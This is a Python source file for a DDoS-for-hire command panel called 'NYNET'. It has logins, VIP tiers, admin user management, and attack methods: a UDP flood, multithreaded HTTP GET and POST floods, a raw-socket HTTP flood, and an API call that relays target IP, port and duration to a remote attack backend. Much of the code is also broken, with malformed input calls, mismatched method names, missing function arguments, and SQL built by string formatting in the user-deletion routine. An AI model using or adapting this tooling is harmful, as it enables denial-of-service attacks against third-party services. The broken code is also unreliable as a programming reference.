import os, time, requests, hashlib, socket, threading, hashlib, sqlite3, json, random
from urllib.parse import *
from colorama import Fore as F, init

init()

#server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #If you are hosting your database.db on another server please change these
#server.bind(("localhost", 9999))
#server.listen()
__version__ = 1.0
__developer_message__ = '' #Add your developer message here
admin_users = ['root'] #Put your admin users here
vip_users = ['root'] #Put VIP users here
vip_methods = ['HTTP-NYNY'] #VIP methods
none_vip = ['HTTP-SOCK', 'RAW-GET', 'RAW-POST', 'RAW-HOME'] #DON'T CHANGE
blacklist_ips = ['127.0.0.1', '1.1.1.1'] #Add blacklisted IPs. You should add your VPS server here

def login(c):
    os.system('cls')
    c.send(" Username: ".encode())
    username = c.recv(2048).decode()
    c.send(" Password: ".encode())
    password = c.recv(2048).decode()
    #username = hashlib.sha256(username).hexdigest()
    password = hashlib.sha256(password).hexdigest()
    conn = sqlite3.connect("database.db")
    cur = conn.cursor()

    cur.execute("SELECT * FROM database WHERE username = ? AND password = ?", (username, password))

    if cur.fetchall():
        c.send('Log in success...'.encode())
        time.sleep(2)
        with open('Config/logs.txt', 'a') as f1:
            f1.write(f'\n{username} logged in')
            f1.close()
        banner(username)
    else:
        c.send('Login failed...'.encode())
        login()

def delete_user(username):
    try:
        conn = sqlite3.connect("database.db")
        cur = conn.cursor()

        cur.execute(f"DELETE FROM database WHERE username={username}")
        print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}Deleted user {F.YELLOW}{username}{F.RED} from database')
        menu()
    except Exception:
        print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}Could not delete user {F.YELLOW}{username}{F.RED} from database')
        menu()

def add_user(new_user,new_password):
    try:
        conn = sqlite3.connect("database.db")
        cur = conn.cursor()
        new_user = new_user 
        new_password = hashlib.sha256(f"{new_password}".encode()).hexdigest()
        cur.execute("INSERT INTO database (username, password) VALUES (?, ?)", (new_user, new_password))
        print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}User {F.YELLOW}{new_user}{F.RED} added to database')
        menu()
    except Exception:
        print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}Could not add {F.YELLOW}{new_user}{F.RED} to database')
        menu()

def api_attack(username,attk_meth):
    method = attk_meth
    ip = input(' IP :: ')
    port = input(' PORT :: ')
    flood_time = input(' TIME :: ')
    os.system('cls')
    if ip in blacklist_ips:
        print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}You can not attack this IP')
        menu()
    elif ip == None:
        print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}Please specify a IP')
        menu()
    elif port == None:
        print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}Please specify a port')
        menu()
    elif flood_time == None:
        print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}Please specify flood time')
        menu()
    else:
        print("")
        try:
            requests.get(f'https://example.com/?ip={ip}&port={port}&metho={method}&time={flood_time}')
            print(" " * 25 + f' {F.MAGENTA}═' * 20)
            print("")
            print(" " * 27 + f' {F.MAGENTA}NYNET ATTACK!')
            print("")
            print(" " * 27 + f' {F.MAGENTA}HOST: {F.YELLOW}{ip}')
            print(" " * 27 + f' {F.MAGENTA}PORT: {F.YELLOW}{port}')
            print(" " * 27 + f' {F.MAGENTA}TIME: {F.YELLOW}{flood_time}')
            print(" " * 25 + f' {F.MAGENTA}═' * 20)
            with open(f'Config/attacks.json', 'w') as f:
                f.write('{' + f'"Host": "{ip}", "Port": "{port}", "Username": "{username}"')
                f.close()
            with open(f'Config/logs.txt', 'a') as f2:
                f2.write(f'\n{username} used attack {attk_meth}')
                f2.close()
            menu()
        except Exception:
            print("")
            print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.YELLOW}Could not send attack')
            time.sleep(2)
            menu()

def geoip(ip):
    try:
        r = requests.get(f'https://api.hackertarget.com/ipgeo/?q={ip}')
        res = r.text
        print(res)
        menu()
    except Exception:
        print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.YELLOW}Could not lookup {F.RED}{ip}{F.RESET}')
        menu()

def help_menu():
    print("")
    print(" " * 25 + f' {F.MAGENTA}═' * 20)
    print("")
    print(" " * 27 + f' {F.MAGENTA}NYNET HELP MENU')
    print("")
    print(" " * 27 + f' {F.MAGENTA}VERSION: {F.YELLOW}{__version__}')
    print(" " * 27 + f' {F.MAGENTA}Developer: {F.YELLOW}Ny-Networks')
    print(" " * 27 + f' {F.MAGENTA}Discord: {F.YELLOW}https://discord.gg/nynet')
    print("")
    print(" " * 27 + f' {F.MAGENTA}attack  ~ {F.YELLOW}starts an attack')
    print(" " * 27 + f' {F.MAGENTA}geoip   ~ {F.YELLOW}looks up a IP')
    print(" " * 27 + f' {F.MAGENTA}methods ~ {F.YELLOW}displays the methods')
    print(" " * 25 + f' {F.MAGENTA}═' * 20)
    menu()

def admin_help_menu():
    print("")
    print(" " * 25 + f' {F.MAGENTA}═' * 20)
    print("")
    print(" " * 27 + f' {F.MAGENTA}NYNET ADMIN HELP MENU')
    print("")
    print(" " * 27 + f' {F.MAGENTA}VERSION: {F.YELLOW}{__version__}')
    print(" " * 27 + f' {F.MAGENTA}Developer: {F.YELLOW}Ny-Networks')
    print(" " * 27 + f' {F.MAGENTA}Discord: {F.YELLOW}https://discord.gg/nynet')
    print("")
    print(" " * 27 + f' {F.MAGENTA}attack     ~ {F.YELLOW}starts an attack')
    print(" " * 27 + f' {F.MAGENTA}geoip   ~ {F.YELLOW}looks up a IP')
    print(" " * 27 + f' {F.MAGENTA}methods    ~ {F.YELLOW}displays the methods')
    print(" " * 27 + f' {F.MAGENTA}add_user   ~ {F.YELLOW}adds user to the database')
    print(" " * 27 + f' {F.MAGENTA}del_user   ~ {F.YELLOW}deletes a user from the database')
    print(" " * 27 + f' {F.MAGENTA}clear_logs ~ {F.YELLOW}clears NyNet logs')
    print(" " * 25 + f' {F.MAGENTA}═' * 20)
    menu()

### IN-HOUSE METHODS ###

def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def raw_home():
    try:
        ip = input('IP >> ')
        if ip in blacklist_ips:
            print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.YELLOW}Could not attack (blacklisted) {F.RED}{ip}{F.RESET}')
            menu()
        else:
            port = input(int('PORT >> '))
            flood_time = input(int('TIME >> '))
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random.randint(00000, 15000)
            print(f'{F.WHITE}[{F.GREEN}+{F.WHITE}] Sending packets')
            try:
                for _ in range(flood_time):
                    sock.sendto(bytes(ip,port))
            except Exception:
                print(f'{F.WHITE}[{F.RED}!{F.WHITE}] Could not send packets')
                time.sleep(2)
                menu()
            except KeyboardInterrupt:
                print(f'{F.WHITE}[{F.YELLOW}!{F.WHITE}] Stopping Flood...')
                time.sleep(2)
                menu()
    except Exception:
        print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.YELLOW}Something went wrong')
        menu()

def http_get(url,timing):
    for _ in range(int(timing)):
        try:
            requests.get(url)
            requests.get(url)
        except:
            pass

def http_post(url,timing):
    for _ in range(int(timing)):
        try:
            requests.post(url)
            requests.post(url)
        except:
            pass

def http_sock(url,timing,req):
    sock = socket.socket()
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,1)
    sock.connect((str(url['host']), int(url['port'])))
    for _ in range(int(timing)):
        try:
            try:
                for i in range(100):
                    sock.send(str.encode(req))
            except:
                sock.close()
        except:
            pass

def start_raw_get():
    url = input('URL >> ')
    timing = input(int('TIME >> '))
    attk_threads = 200
    for _ in range(int(attk_threads)):
        try:
            attk = threading.Thread(target=http_get, args=(url, timing))
            attk.start()
            menu()
        except Exception:
            menu()
        except KeyboardInterrupt:
            menu()

def start_raw_post():
    url = input('URL >> ')
    timing = input(int('TIME >> '))
    attk_threads = 200
    for _ in range(int(attk_threads)):
        try:
            attk = threading.Thread(target=http_post, args=(url, timing))
            attk.start()
        except Exception:
            pass
        except KeyboardInterrupt:
            menu()

def start_http_sock():
    url = input('URL >> ')
    timing = input(int('TIME >> '))
    with open('Config/UA.txt', 'r') as f:
        ua = f.readlines()
        f.close()
    target = get_target(url)
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(200)):
        try:
            thd = threading.Thread(target=http_sock, args=(target,timing,req))
            thd.start()
        except Exception:
            pass


def banner(username):
    username = username
    os.system('cls')
    banner = f''' {F.MAGENTA}███{F.YELLOW}╗   {F.MAGENTA}██{F.YELLOW}╗{F.MAGENTA}██{F.YELLOW}╗   {F.MAGENTA}██{F.YELLOW}╗{F.MAGENTA}███{F.YELLOW}╗   {F.MAGENTA}██{F.YELLOW}╗{F.MAGENTA}███████{F.YELLOW}╗{F.MAGENTA}████████{F.YELLOW}╗
 {F.MAGENTA}████{F.YELLOW}╗  {F.MAGENTA}██{F.YELLOW}║╚{F.MAGENTA}██{F.YELLOW}╗ {F.MAGENTA}██{F.YELLOW}╔╝{F.MAGENTA}████{F.YELLOW}╗  {F.MAGENTA}██{F.YELLOW}║{F.MAGENTA}██{F.YELLOW}╔════╝╚══{F.MAGENTA}██{F.YELLOW}╔══╝
 {F.MAGENTA}██{F.YELLOW}╔{F.MAGENTA}██{F.YELLOW}╗ {F.MAGENTA}██{F.YELLOW}║ ╚{F.MAGENTA}████{F.YELLOW}╔╝ {F.MAGENTA}██{F.YELLOW}╔{F.MAGENTA}██{F.YELLOW}╗ {F.MAGENTA}██{F.YELLOW}║{F.MAGENTA}█████{F.YELLOW}╗     {F.MAGENTA}██{F.YELLOW}║   
 {F.MAGENTA}{F.MAGENTA}██{F.YELLOW}║╚{F.MAGENTA}██{F.YELLOW}╗{F.MAGENTA}██{F.YELLOW}║  ╚{F.MAGENTA}██{F.YELLOW}╔╝  {F.MAGENTA}██{F.YELLOW}║╚{F.MAGENTA}██{F.YELLOW}╗{F.MAGENTA}██{F.YELLOW}║{F.MAGENTA}██{F.YELLOW}╔══╝     {F.MAGENTA}██{F.YELLOW}║   
 {F.MAGENTA}██{F.YELLOW}║ ╚{F.MAGENTA}████{F.YELLOW}║   {F.MAGENTA}██{F.YELLOW}║   {F.MAGENTA}██{F.YELLOW}║ ╚{F.MAGENTA}████{F.YELLOW}║{F.MAGENTA}███████{F.YELLOW}╗   {F.MAGENTA}██{F.YELLOW}║   
 {F.YELLOW}╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
                                              ''' + F.RESET
    print("")
    print(banner)
    print(f" {F.WHITE}-{F.YELLOW} Developed by {F.MAGENTA}Ny-Networks {F.WHITE}-")
    print("")
    menu(username)

def menu(username):
    methods = {
        "RAW-HOME" : "Home method", 
        "RAW-GET" : "HTTP get flooder (raw power)",
        "RAW-POST" : "HTTP post flooder (raw power)",
        "HTTP-SOCK" : "HTTP socket flooding"
        } #CHANGE THESE TO YOUR API METHODS
    
    option = input(f"{username}@NYNET >>  ")
    if option == 'clear':
        banner()
    elif option == 'attack':
        attk_meth = input('Method :: ')
        if attk_meth in vip_methods and username not in vip_users:
            print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}You do not have a VIP plan')
            menu()
        elif attk_meth == None:
            print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}Please specify a method')
            menu()
        elif attk_meth in vip_methods:
            api_attack(username,attk_meth)
        elif attk_meth in none_vip:
            if attk_meth == "RAW-HOME":
                raw_home()
            elif attk_meth == 'RAW_GET':
                start_raw_get()
            elif attk_meth == "RAW_POST":
                start_raw_post()
            elif attk_meth == "HTTP-SOCKET":
                start_http_sock()
        else:
            print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}{attk_meth}{F.YELLOW}not in attack list')
            menu()
    elif option == 'help':
        if username in admin_users:
            admin_help_menu()
        else:
            help_menu()
    elif option == 'methods':
        for meth in methods:
            try:
                print(f'{F.YELLOW}{methods} {F.WHITE}~ {F.RED}' + methods[meth] + F.RESET) #Change to meth + methods[meth]
            except Exception:
                pass
        menu()
    elif option == 'clear_logs': #Admin command
        if username not in admin_users:
            print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}You are not a admin')
            with open('Config/logs.txt', 'a') as f:
                f.write(f'\n{username} tried to clear logs')
                f.close()
            menu()
        else:
            try:
                os.remove(f'Config/logs.txt')
                print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}Logs have been cleared')
                menu()
            except Exception:
                print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}Could not clear logs')
                menu()
    elif option == 'del_user': #Admin command
        if username not in admin_users:
            print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}You are not a admin')
            menu()
        else:
            username = input('[NYNET] ~ User :: ')
            delete_user(username)
    elif option == 'add_user': #Admin command
        if username not in admin_users:
            print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}You are not a admin')
            menu()
        else:
            new_user = input('[NYNET] ~ New User :: ')
            new_password = input('[NYNET] ~ Password :: ')
            add_user(new_user,new_password)
    elif option == 'geoip':
        ip = input('IP :: ')
        if ip == None:
            print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.YELLOW}Please specify a IP')
            menu()
        elif ip[2] or ip[3] != '.':
            print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.YELLOW}Please input a valid IP')
        else:
            geoip(ip)
    else:
        print(f'{F.MAGENTA}[NYNET] {F.WHITE}~ {F.RED}{option}{F.YELLOW}not found')
        menu()
        
banner()